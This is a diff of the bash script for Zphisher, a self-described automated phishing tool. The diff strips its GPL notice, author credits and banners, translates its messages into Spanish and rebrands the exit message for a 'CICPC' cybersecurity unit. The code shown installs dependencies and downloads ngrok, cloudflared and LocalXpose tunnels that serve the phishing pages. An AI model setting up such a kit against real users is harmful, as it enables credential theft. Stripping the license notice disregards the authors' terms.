@@ -1,93 +1,5 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
-
-
-##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 3, 29 June 2007
-##
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
-##    Everyone is permitted to copy and distribute verbatim copies
-##    of this license document, but changing it is not allowed.
-##
-##                         Preamble
-##
-##    The GNU General Public License is a free, copyleft license for
-##    software and other kinds of works.
-##
-##    The licenses for most software and other practical works are designed
-##    to take away your freedom to share and change the works.  By contrast,
-##    the GNU General Public License is intended to guarantee your freedom to
-##    share and change all versions of a program--to make sure it remains free
-##    software for all its users.  We, the Free Software Foundation, use the
-##    GNU General Public License for most of our software; it applies also to
-##    any other work released this way by its authors.  You can apply it to
-##    your programs, too.
-##
-##    When we speak of free software, we are referring to freedom, not
-##    price.  Our General Public Licenses are designed to make sure that you
-##    have the freedom to distribute copies of free software (and charge for
-##    them if you wish), that you receive source code or can get it if you
-##    want it, that you can change the software or use pieces of it in new
-##    free programs, and that you know you can do these things.
-##
-##    To protect your rights, we need to prevent others from denying you
-##    these rights or asking you to surrender the rights.  Therefore, you have
-##    certain responsibilities if you distribute copies of the software, or if
-##    you modify it: responsibilities to respect the freedom of others.
-##
-##    For example, if you distribute copies of such a program, whether
-##    gratis or for a fee, you must pass on to the recipients the same
-##    freedoms that you received.  You must make sure that they, too, receive
-##    or can get the source code.  And you must show them these terms so they
-##    know their rights.
-##
-##    Developers that use the GNU GPL protect your rights with two steps:
-##    (1) assert copyright on the software, and (2) offer you this License
-##    giving you legal permission to copy, distribute and/or modify it.
-##
-##    For the developers' and authors' protection, the GPL clearly explains
-##    that there is no warranty for this free software.  For both users' and
-##    authors' sake, the GPL requires that modified versions be marked as
-##    changed, so that their problems will not be attributed erroneously to
-##    authors of previous versions.
-##
-##    Some devices are designed to deny users access to install or run
-##    modified versions of the software inside them, although the manufacturer
-##    can do so.  This is fundamentally incompatible with the aim of
-##    protecting users' freedom to change the software.  The systematic
-##    pattern of such abuse occurs in the area of products for individuals to
-##    use, which is precisely where it is most unacceptable.  Therefore, we
-##    have designed this version of the GPL to prohibit the practice for those
-##    products.  If such problems arise substantially in other domains, we
-##    stand ready to extend this provision to those domains in future versions
-##    of the GPL, as needed to protect the freedom of users.
-##
-##    Finally, every program is threatened constantly by software patents.
-##    States should not allow patents to restrict development and use of
-##    software on general-purpose computers, but in those that do, we wish to
-##    avoid the special danger that patents applied to a free program could
-##    make it effectively proprietary.  To prevent this, the GPL assures that
-##    patents cannot be used to render the program non-free.
-##
-##    The precise terms and conditions for copying, distribution and
-##    modification follow.
-##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
-##
-
-##   THANKS TO :
-##   1RaY-1 - https://github.com/1RaY-1
-##   Aditya Shakya - https://github.com/adi1090x
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Moises Tapia - https://github.com/MoisesTapia
-##   Mr.Derek - https://github.com/E343IO
-##   Mustakim Ahmed - https://github.com/bdhackers009
-##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
 __version__="2.3.5"
@@ -195,61 +107,35 @@ check_update(){
 
 ## Check Internet Status
 check_status() {
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Estatus del Internet : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
 
-## Banner
-banner() {
-	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
-
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
-	EOF
-}
-
-## Small Banner
-banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-	EOF
-}
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando paquetes requeridos.."
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Paquetes: ${ORANGE}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Paquetes: ${ORANGE}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
 
 	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Paquetes ya instalados."
 	else
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Paquetes: : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -305,7 +191,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
@@ -324,7 +210,7 @@ install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
@@ -343,7 +229,7 @@ install_localxpose() {
 	if [[ -e ".server/loclx" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Instalando LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
@@ -359,8 +245,8 @@ install_localxpose() {
 
 ## Exit message
 msg_exit() {
-	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	{ clear; echo; }
+	echo -e "${GREENBG}${BLACK} CICPC UNIDAD DE CIBERSEGURIDAD ${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
